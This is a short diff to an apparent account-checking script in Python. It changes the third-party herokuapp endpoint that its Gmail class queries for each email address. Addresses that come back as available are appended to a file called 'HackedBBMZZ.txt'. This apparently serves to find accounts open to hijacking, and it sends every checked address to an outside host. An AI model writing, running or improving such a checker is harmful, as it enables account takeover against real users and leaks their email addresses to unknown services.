@@ -121,9 +121,9 @@ class Gmail:
                         
                     
                     elif ('"user":true,') in self.rf:
-                        self.req = requests.get(f'https://api-zi-7c2fc6a6a5b2.herokuapp.com/api1/gmail/v1.v.v.v/{self.email}').json()
-                        self.cn = self.req['status']
-                        if self.cn == 'Ok':
+                        self.req = requests.get(f'https://apiibbmzz-5ec7efdc4d56.herokuapp.com/api/gmail/v2/{self.email}').text
+                       
+                        if ('"email":"true"') in self.req:
                             with open('HackedBBMZZ.txt','a') as f8:
                                     f8.write(f'{self.email}\n')
                             self.ok +=1
